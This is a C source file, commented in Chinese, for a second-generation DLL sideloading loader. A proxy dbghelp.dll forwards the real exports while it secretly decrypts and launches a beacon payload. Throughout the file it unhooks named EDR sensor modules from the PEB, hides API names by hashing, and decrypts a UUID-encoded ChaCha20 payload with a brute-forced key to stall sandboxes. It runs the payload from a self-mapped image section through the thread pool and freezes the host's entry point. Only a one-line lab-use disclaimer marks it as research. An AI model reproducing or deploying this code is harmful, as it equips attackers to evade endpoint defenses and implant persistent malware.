/*
 * dbghelp_proxy —— 第二代 DllMain 白加黑加载器（v5 链）
 *
 * 谱系：
 *   一代：https://github.com/Neo-Maoku/DllMainHijacking（原样 vendor 在 ../vendor）
 *         解决经典白加黑死锁问题：代理 DLL 在 DllMain 里跑 shellcode 时
 *         因持有 loader lock 而卡死。一代通过 LdrFastFailInLoaderCallout
 *         特征定位锁标记并释放锁（Win7/Win10/Win11 兼容）。
 *
 *   二代（本项目）：完全不动锁，从根上绕开锁问题，并把现代 EDR 真正在
 *         打分的每一层都做了加固：
 *
 *     1. hide_console()     —— CONSOLE 子系统宿主（如 cmake.exe）启动会弹
 *                              黑框；DllMain 第一个动作就断开控制台，宿主
 *                              全程不可见。
 *     2. blind_unlink()     —— 把 EDR 注入的用户态传感器（atcuf64.dll =
 *                              行为遥测、bdhkm64.dll = API hook）从本进程
 *                              的 PEB 模块链表里摘除。只摘链表节点，绝不碰
 *                              传感器代码与文件，不触发任何防篡改告警。
 *     3. fwd_resolve()      —— 导出转发：按绝对路径加载系统真 dbghelp.dll，
 *                              通过跳转表服务它的每一个导出，宿主功能完全
 *                              正常。不落任何副本文件。
 *     4. phantom 自镜像     —— 不分配私有可执行内存（RWX 一出现就是行为
 *                              现行），而是打开"自己的文件"，以 SEC_IMAGE
 *                              方式重新映射（文件映射、MEM_IMAGE，内存扫描
 *                              视角与普通 DLL 无异），把解密后的载荷写进
 *                              自己超大的 .text 段并从那里执行。全程零私有
 *                              可执行内存。
 *     5. 载荷加密           —— UUID 格式字符串表原地解码，ChaCha20 密钥
 *                              暴破 3 个未知字节 + 首块 CRC32 校验还原
 *                              （约 1670 万次迭代：天然沙箱模拟器延迟），
 *                              随后流式解密其余部分。
 *     6. 无线程执行         —— 通过 TpAllocWork/TpPostWork 把执行提交到
 *                              线程池。没有 NtCreateThreadEx、没有
 *                              Get/SetThreadContext —— 内核侧线程遥测
 *                              无从打分。
 *     7. 入口自旋           —— 秒退型宿主（cmake.exe 打印用法后 <1 秒退出）
 *                              会带走信标线程。DllMain 返回前把宿主 PE
 *                              入口点改写为 "jmp $"（EB FE），进程从此
 *                              永生，线程池回调就是信标本体。宿主自己的
 *                              main() 永远不会执行——这是刻意设计。
 *
 *   构建：见 README.md（MSVC 走 build_msvc.cmd，MinGW 走 build_mingw.cmd，
 *   或在项目根目录直接 python build.py 一键完成）。换载荷用
 *   tools/gen_payload.py 重新生成载荷头。
 *
 *   本物仅限所有者自建实验室环境的授权安全研究使用。
 *   请勿用于非授权系统。
 */

#include <windows.h>
#include "peb_resolve.h"
#include "forwarding_count.h"
#include "forwarding_names.h"
#include "payload_payload.h"
/* MSVC：fp_N 转发桩在 src/forwarding.asm（MASM；x64 上 MSVC 无内联汇编）。
   GCC ：fp_N 转发桩在下方 g_fwd 声明之后 include 的 forwarding_stubs.h。 */

/* ------------------------------------------------------------------ *
 * 极简 C 运行时：DLL 以 /NODEFAULTLIB 链接，这里补齐编译器可能下沉为
 * libcalls 的少数内建函数。
 * MSVC：#pragma function() 告知编译器把它们当普通函数处理
 *（否则"定义内建函数"直接报错）。
 * ------------------------------------------------------------------ */
#if defined(_MSC_VER)
#pragma function(memcpy, memset)
#endif
void* __cdecl memcpy(void* dst, const void* src, size_t n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
    return dst;
}

void* __cdecl memset(void* dst, int v, size_t n) {
    unsigned char* d = (unsigned char*)dst;
    while (n--) *d++ = (unsigned char)v;
    return dst;
}

/* MinGW 的 -nostdlib 模式需要一个假栈探针；MSVC 不需要。 */
#if !defined(_MSC_VER)
__attribute__((naked)) void ___chkstk_ms(void) {
    __asm__ volatile("ret");
}
#endif

/* ------------------------------------------------------------------ *
 * API 哈希（djb2，算法见 peb_resolve.h）。二进制里不出现任何 API 名
 * 字符串——所有导入通过遍历 PEB 模块链表按哈希解析。
 * ------------------------------------------------------------------ */
#define HC_KERNEL32   0x7040EE75u
#define HC_NTDLL      0x22D3B5EDu
#define HF_GetProcAddress        0xCF31BB1Fu
#define HF_LoadLibraryA          0x5FBFF0FBu
#define HF_FreeConsole           0x8AFB8C5Au
#define HF_NtCreateSection       0xD02E20D0u
#define HF_NtMapViewOfSection    0x231F196Au
#define HF_NtUnmapViewOfSection  0x595014ADu
#define HF_NtClose               0x8B8E133Du
#define HF_CreateFileA           0xEB96C5FAu
#define HF_NtProtectVirtualMemory 0x082962C8u
#define HF_TpAllocWork           0x35829537u
#define HF_TpPostWork            0xC94FC392u
#define HF_GetModuleFileNameA    0x13B8A14Du


typedef HMODULE   (WINAPI* fnLLA)(LPCSTR);
typedef FARPROC   (WINAPI* fnGPA)(HMODULE, LPCSTR);
typedef BOOL      (WINAPI* fnFreeCon)(void);
typedef DWORD     (WINAPI* fnGMFNA)(HMODULE, LPSTR, DWORD);
typedef NTSTATUS  (NTAPI* fnNtCS)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS  (NTAPI* fnNtMVS)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS  (NTAPI* fnNtUVS)(HANDLE, PVOID);
typedef HANDLE    (WINAPI* fnCFA)(LPCSTR, DWORD, DWORD, PVOID, DWORD, DWORD, HANDLE);
typedef NTSTATUS  (NTAPI* fnNtCl)(HANDLE);
typedef NTSTATUS  (NTAPI* fnNtProt)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS  (NTAPI* fnTpWork)(PTP_WORK*, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef void      (NTAPI* fnTpPost)(PTP_WORK);

/* NT 打开文件选项位（winternl.h 里有，用户态头文件常缺失）。 */
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000010
#endif

/* NTSTATUS 辅助宏：只有负值才算错误。STATUS_IMAGE_NOT_AT_BASE
 *（0x40000003）这类警告级返回是预期内的正常情况。 */
#define NT_FAILED(s) (((LONG)(s)) < 0)

/* 解析好的真函数指针表，通过 fp_N 桩转交给宿主。 */
FARPROC g_fwd[SD3_NEXPORTS];

#if !defined(_MSC_VER)
#include "forwarding_stubs.h"   /* GCC：fp_0..fp_N 裸函数桩 */
#endif

/* ================================================================== *
 * 阶段 1 —— hide_console：断开 CONSOLE 子系统宿主的控制台窗口
 * ================================================================== */
#ifdef SD3_SPIN
static void hide_console(void) {
    HMODULE hK32 = get_module_by_hash(HC_KERNEL32);
    if (!hK32) return;
    fnFreeCon pFC = (fnFreeCon)get_proc_by_hash(hK32, HF_FreeConsole);
    if (pFC) pFC();   /* 黑框即刻关闭；进程继续运行 */
}
#endif

/* ================================================================== *
 * 阶段 2 —— blind_unlink：把 EDR 用户态传感器从 PEB 摘链
 * ================================================================== */
#ifdef SD3_BLIND
static int bl_ieq(const wchar_t* a, const wchar_t* b, int n) {
    for (int i = 0; i < n; i++) {
        wchar_t ca = a[i], cb = b[i];
        if (ca >= L'A' && ca <= L'Z') ca += 0x20;
        if (cb >= L'A' && cb <= L'Z') cb += 0x20;
        if (ca != cb) return 0;
    }
    return 1;
}

static void blind_unlink(void) {
    unsigned long long peb = __readgsqword(0x60);
    unsigned long long ldr = *(unsigned long long*)(peb + 0x18);
    if (!ldr) return;

    /* 遍历 InLoadOrderModuleList（PEB->Ldr + 0x10）。 */
    unsigned long long head = ldr + 0x10;
    unsigned long long cur = *(unsigned long long*)head;
    int guard = 0;
    while (cur && cur != head && guard++ < 128) {
        unsigned long long next = *(unsigned long long*)cur;

        /* LDR_DATA_TABLE_ENTRY x64：BaseDllName UNICODE_STRING 在 +0x58。 */
        unsigned short blen = *(unsigned short*)(cur + 0x58);
        wchar_t* bbuf = *(wchar_t**)(cur + 0x60);
        int hit = 0;
        if (bbuf && blen >= 10) {
            if (bl_ieq(bbuf, L"atcuf", 5)) hit = 1;   /* atcuf64.dll：BD 行为遥测 */
            if (bl_ieq(bbuf, L"bdhkm", 5)) hit = 1;   /* bdhkm64.dll：BD API hook */
        }
        if (hit) {
            /* 三个内嵌 LIST_ENTRY 节点位于 +0x00、+0x10、+0x20
             *（注意：不是连续的 Flink/Blink 对！偏移写错会打乱
             * 链表导致线程池初始化挂死）。 */
            unsigned long long* l0 = (unsigned long long*)(cur + 0x00);
            unsigned long long* l1 = (unsigned long long*)(cur + 0x10);
            unsigned long long* l2 = (unsigned long long*)(cur + 0x20);
            unsigned long long* f, * b;
            f = (unsigned long long*)l0[0]; b = (unsigned long long*)l0[1];
            f[1] = (unsigned long long)b; b[0] = (unsigned long long)f;
            f = (unsigned long long*)l1[0]; b = (unsigned long long*)l1[1];
            f[1] = (unsigned long long)b; b[0] = (unsigned long long)f;
            f = (unsigned long long*)l2[0]; b = (unsigned long long*)l2[1];
            f[1] = (unsigned long long)b; b[0] = (unsigned long long)f;
        }
        cur = next;
    }
}
#endif /* SD3_BLIND */

/* ================================================================== *
 * 阶段 3 —— fwd_resolve：所有导出转发到系统真 DLL
 * ================================================================== */
static void fwd_resolve(void) {
    HMODULE hK32 = get_module_by_hash(HC_KERNEL32);
    if (!hK32) return;
    fnGPA pGPA = (fnGPA)get_proc_by_hash(hK32, HF_GetProcAddress);
    fnLLA pLLA = (fnLLA)get_proc_by_hash(hK32, HF_LoadLibraryA);
    if (!pGPA || !pLLA) return;

    /* 用绝对路径加载，避免加载器把请求解析回本代理自身。 */
    char path[MAX_PATH];
    UINT n = GetSystemDirectoryA(path, MAX_PATH - 20);
    if (n == 0 || n >= MAX_PATH - 20) return;
    if (path[n - 1] != '\\') path[n++] = '\\';
    {
        const char* tgt = "dbghelp.dll";
        for (int i = 0; tgt[i]; i++) path[n++] = tgt[i];
        path[n] = 0;
    }

    HMODULE hReal = pLLA((LPCSTR)path);
    if (!hReal) return;
    for (unsigned int i = 0; i < SD3_NEXPORTS; i++) {
        /* fp_<i> 桩按 .def 文件同样的顺序索引 g_fwd，而 .def 是
         * gen_exports.py 从真 DLL 的导出表生成的——所以这里直接
         * 按名字取第 i 个导出的真实地址即可。 */
        g_fwd[i] = pGPA(hReal, (LPCSTR)sd3_export_names[i]);
    }
}

/* ================================================================== *
 * 载荷解密：ChaCha20 + 3 字节暴破还原密钥
 * ================================================================== */
__forceinline unsigned long dv_rotl(unsigned long v, int n) {
    return (v << n) | (v >> (32 - n));
}
#define DV_QR(a,b,c,d)                                              \
    a += b; d ^= a; d = dv_rotl(d, 16); c += d; b ^= c; b = dv_rotl(b, 12); \
    a += b; d ^= a; d = dv_rotl(d, 8);  c += d; b ^= c; b = dv_rotl(b, 7);

/* 标准 ChaCha20 块函数：20 轮列/行混淆后加回初始状态。 */
__forceinline void dv_chacha_block(unsigned long st[16], unsigned char out[64]) {
    unsigned long s[16];
    for (int i = 0; i < 16; i++) s[i] = st[i];
    for (int r = 0; r < 10; r++) {
        DV_QR(s[0], s[4], s[8], s[12])  DV_QR(s[1], s[5], s[9], s[13])
        DV_QR(s[2], s[6], s[10], s[14]) DV_QR(s[3], s[7], s[11], s[15])
        DV_QR(s[0], s[5], s[10], s[15]) DV_QR(s[1], s[6], s[11], s[12])
        DV_QR(s[2], s[7], s[8], s[13])  DV_QR(s[3], s[4], s[9], s[14])
    }
    for (int i = 0; i < 16; i++) ((unsigned long*)out)[i] = s[i] + st[i];
}

/* 对前 64 字节做 CRC32（用于暴破密钥时的明文头校验）。 */
__forceinline unsigned long dv_crc64(const unsigned char* p) {
    unsigned long c = 0xFFFFFFFF;
    for (int i = 0; i < 64; i++) {
        c ^= p[i];
        for (int j = 0; j < 8; j++) c = (c >> 1) ^ (0xEDB88320u & (-(long)(c & 1)));
    }
    return ~c;
}

__forceinline unsigned char dv_nib(char c) {
    if (c >= '0' && c <= '9') return (unsigned char)(c - '0');
    if (c >= 'a' && c <= 'f') return (unsigned char)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (unsigned char)(c - 'A' + 10);
    return 0;
}

/* 把 UUID 格式字符串表原地解码为每行 16 字节的密文。 */
static void dv_decode(unsigned char* cur) {
    for (unsigned int i = 0; i < UUID_COUNT; i++) {
        const char* u = sc_uuids[i];
        int j = 0;
        for (int k = 0; u[k] && j < 16; k++) {
            if (u[k] == '-') continue;
            cur[j] = (unsigned char)((dv_nib(u[k]) << 4) | dv_nib(u[k + 1]));
            k++; j++;
        }
        cur += 16;
    }
}

/* 还原 3 个未知密钥字节：先把两个内嵌的 29 字节半段异或，再对剩余
 * 3 字节暴破，用首块明文的 CRC32 做校验（约 1670 万次迭代，天然
 * 沙箱延迟）。 */
static int dv_recover_key(unsigned char* target, unsigned char full[32]) {
    unsigned long st[16];
    unsigned char blk[64];
    for (int i = 0; i < 29; i++) full[i] = (unsigned char)(g_key_masked[i] ^ g_key_mask[i]);
    for (unsigned int b0 = 0; b0 < 256; b0++) {
        full[29] = (unsigned char)b0;
        for (unsigned int b1 = 0; b1 < 256; b1++) {
            full[30] = (unsigned char)b1;
            for (unsigned int b2 = 0; b2 < 256; b2++) {
                full[31] = (unsigned char)b2;
                st[0] = 0x61707865; st[1] = 0x3320646E;
                st[2] = 0x79622D32; st[3] = 0x6B206574;
                for (int i = 0; i < 8; i++) st[4 + i] = ((unsigned long*)full)[i];
                st[12] = 1;
                st[13] = ((unsigned long*)g_nonce)[0];
                st[14] = ((unsigned long*)g_nonce)[1];
                st[15] = ((unsigned long*)g_nonce)[2];
                dv_chacha_block(st, blk);
                for (int i = 0; i < 64; i++) target[i] ^= blk[i];
                if (dv_crc64(target) == G_HEADER_CRC32) return 1;
                for (int i = 0; i < 64; i++) target[i] ^= blk[i];  /* 不匹配则回滚重试 */
            }
        }
    }
    return 0;
}

/* 流式解密首块之后的全部内容（计数器从 2 起）。 */
static void dv_stream_decrypt(unsigned char* p, unsigned long len, const unsigned char full[32]) {
    unsigned long st[16];
    st[0] = 0x61707865; st[1] = 0x3320646E;
    st[2] = 0x79622D32; st[3] = 0x6B206574;
    for (int i = 0; i < 8; i++) st[4 + i] = ((unsigned long*)full)[i];
    st[12] = 2;
    st[13] = ((unsigned long*)g_nonce)[0];
    st[14] = ((unsigned long*)g_nonce)[1];
    st[15] = ((unsigned long*)g_nonce)[2];
    for (unsigned long o = 64; o < len; o += 64) {
        unsigned char ks[64];
        dv_chacha_block(st, ks);
        unsigned long chunk = (len - o < 64) ? (len - o) : 64;
        for (unsigned long i = 0; i < chunk; i++) p[o + i] ^= ks[i];
        st[12]++;
    }
}

/* 擦除密钥材料（位于可写 .data 段）。UUID 字符串池在只读 .rdata，
 * 千万不能碰——写它直接访问异常。 */
static void dv_wipe_keys(void) {
    volatile unsigned char* k1 = (volatile unsigned char*)g_key_masked;
    volatile unsigned char* k2 = (volatile unsigned char*)g_key_mask;
    for (int i = 0; i < 29; i++) { k1[i] = 0; k2[i] = 0; }
}

/* ================================================================== *
 * 阶段 4 —— phantom 自镜像：从自己文件的 SEC_IMAGE 映射里执行
 * ================================================================== */
#ifdef SD3_PHANTOM
static void ph_run(HINSTANCE hInst) {
    HMODULE hK32 = get_module_by_hash(HC_KERNEL32);
    HMODULE hNtd = get_module_by_hash(HC_NTDLL);
    if (!hK32 || !hNtd) return;
    fnNtProt pNP = (fnNtProt)get_proc_by_hash(hNtd, HF_NtProtectVirtualMemory);
    fnNtCS   pCS = (fnNtCS)get_proc_by_hash(hNtd, HF_NtCreateSection);
    fnNtMVS  pMV = (fnNtMVS)get_proc_by_hash(hNtd, HF_NtMapViewOfSection);
    fnNtUVS  pUV = (fnNtUVS)get_proc_by_hash(hNtd, HF_NtUnmapViewOfSection);
    fnCFA    pCF = (fnCFA)get_proc_by_hash(hK32, HF_CreateFileA);
    fnNtCl   pCl = (fnNtCl)get_proc_by_hash(hNtd, HF_NtClose);
    fnTpWork pAW = (fnTpWork)get_proc_by_hash(hNtd, HF_TpAllocWork);
    fnTpPost pPW = (fnTpPost)get_proc_by_hash(hNtd, HF_TpPostWork);
    fnGMFNA  pGM = (fnGMFNA)get_proc_by_hash(hK32, HF_GetModuleFileNameA);
    if (!pNP || !pCS || !pMV || !pUV || !pCF || !pCl || !pAW || !pPW || !pGM) return;

    /* 打开自己在磁盘上的文件。一个普通 kernel32 句柄就足够喂给
     * NtCreateSection(SEC_IMAGE)，完全绕开 NtOpenFile 的
     * OBJECT_ATTRIBUTES 那套流程。访问掩码绝不能带写位——运行中的
     * 映像已被加载器以只读共享方式锁死（实测 0x23 含写位 =
     * STATUS_SHARING_VIOLATION，必须用 0x21）。 */
    char apath[MAX_PATH];
    UINT al = pGM(hInst, apath, MAX_PATH);
    if (al == 0 || al >= MAX_PATH - 1) return;
    apath[al] = 0;
    HANDLE hFile = pCF((LPCSTR)apath, 0x80000000u /*GENERIC_READ*/ | 0x20000000u /*GENERIC_EXECUTE*/,
                       FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

    /* 把自己的映像按 SEC_IMAGE 方式再映射一份：文件映射、MEM_IMAGE、
     * 不触发模块加载事件，内存扫描里与真模块并排完全无异。 */
    HANDLE hSec = NULL;
    LARGE_INTEGER lim; lim.QuadPart = 0;
    if (NT_FAILED(pCS(&hSec, 0xF001F, NULL, &lim, PAGE_READONLY, 0x1000000 /*SEC_IMAGE*/, hFile))) {
        pCl(hFile); return;
    }
    pCl(hFile);

    PVOID view = NULL;
    SIZE_T vsz = 0;
    LARGE_INTEGER off; off.QuadPart = 0;
    /* 视图保护低于节的保护没关系；映像被重定位时会返回
     * STATUS_IMAGE_NOT_AT_BASE（0x40000003）——那是警告不是错误
     *（所以用 NT_FAILED 判负值，不能 != 0）。 */
    if (NT_FAILED(pMV(hSec, (HANDLE)-1, &view, 0, 0, &off, &vsz, 1, 0, PAGE_READWRITE))) {
        pCl(hSec); return;
    }
    pCl(hSec);

    /* 定位超大 .text 段（构建时由 payload_payload.h 填充到比载荷大）。 */
    unsigned char* mbase = (unsigned char*)view;
    unsigned long e = *(unsigned long*)(mbase + 0x3C);
    unsigned short nsec = *(unsigned short*)(mbase + e + 6);
    unsigned short osz = *(unsigned short*)(mbase + e + 20);
    unsigned char* sec = mbase + e + 24 + osz;
    unsigned char* textVA = NULL;
    unsigned long textSize = 0;
    for (unsigned short i = 0; i < nsec; i++) {
        unsigned char* s2 = sec + i * 40;
        if (s2[0] == '.' && s2[1] == 't' && s2[2] == 'e' && s2[3] == 'x' && s2[4] == 't') {
            textVA = mbase + *(unsigned long*)(s2 + 12);
            textSize = *(unsigned long*)(s2 + 8);
            break;
        }
    }

    /* 把 phantom .text 翻成可写，原地解密，再翻回可执行。 */
    PVOID tb = textVA; SIZE_T ts = textSize; ULONG oldp = 0;
    if (NT_FAILED(pNP((HANDLE)-1, &tb, &ts, PAGE_READWRITE, &oldp))) {
        pUV((HANDLE)-1, view); return;
    }

    dv_decode(textVA);
    unsigned char full[32];
    if (!dv_recover_key(textVA, full)) { pUV((HANDLE)-1, view); return; }
    dv_stream_decrypt(textVA, SC_LEN, full);
    dv_wipe_keys();

    tb = textVA; ts = textSize;
    pNP((HANDLE)-1, &tb, &ts, PAGE_EXECUTE_READ, &oldp);

    /* 无线程执行：把载荷交给线程池。不创建线程、不碰线程上下文。 */
    PTP_WORK work = NULL;
    if (NT_FAILED(pAW(&work, (PTP_WORK_CALLBACK)textVA, NULL, NULL))) {
        pUV((HANDLE)-1, view); return;
    }
    pPW(work);
}
#endif /* SD3_PHANTOM */

/* ================================================================== *
 * 阶段 5 —— 入口自旋：让秒退型宿主永远活着
 * ================================================================== */
#ifdef SD3_SPIN
static void patch_entry_spin(void) {
    HMODULE hNtd = get_module_by_hash(HC_NTDLL);
    if (!hNtd) return;
    fnNtProt pNP = (fnNtProt)get_proc_by_hash(hNtd, HF_NtProtectVirtualMemory);
    if (!pNP) return;

    /* PEB->ImageBaseAddress -> PE 头 -> AddressOfEntryPoint。 */
    unsigned long long peb = __readgsqword(0x60);
    unsigned char* base = *(unsigned char**)(peb + 0x10);
    if (!base || base[0] != 'M' || base[1] != 'Z') return;
    unsigned long e = *(unsigned long*)(base + 0x3C);
    unsigned long entryRva = *(unsigned long*)(base + e + 24 + 16);
    if (!entryRva) return;
    unsigned char* ep = base + entryRva;

    PVOID tb = (PVOID)ep; SIZE_T ts = 8; ULONG oldp = 0;
    if (NT_FAILED(pNP((HANDLE)-1, &tb, &ts, PAGE_READWRITE, &oldp))) return;
    ep[0] = 0xEB; ep[1] = 0xFE;   /* jmp $ —— 宿主永远到不了自己的 main() */
    tb = (PVOID)ep; ts = 8;
    pNP((HANDLE)-1, &tb, &ts, oldp ? oldp : PAGE_EXECUTE_READ, &oldp);
}
#endif /* SD3_SPIN */

/* ================================================================== *
 * DllMain 总调度
 * ================================================================== */
BOOL WINAPI entry_dll(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);

#ifdef SD3_SPIN
        hide_console();      /* CONSOLE 子系统宿主：干掉黑框 */
#endif
#ifdef SD3_BLIND
        blind_unlink();      /* 最先致盲注入的 EDR 传感器 */
#endif
        fwd_resolve();       /* 给宿主提供真导出 */

#ifdef SD3_PHANTOM
        ph_run(hInst);       /* 解密 + 线程池发射载荷 */
#endif

#ifdef SD3_SPIN
        /* 把宿主冻结在自己的入口点后返回：加载器 init 得以完成，
         * 入口永久空转，已提交的线程池回调（=信标）随后执行。 */
        patch_entry_spin();
#endif
    }
    return TRUE;
}
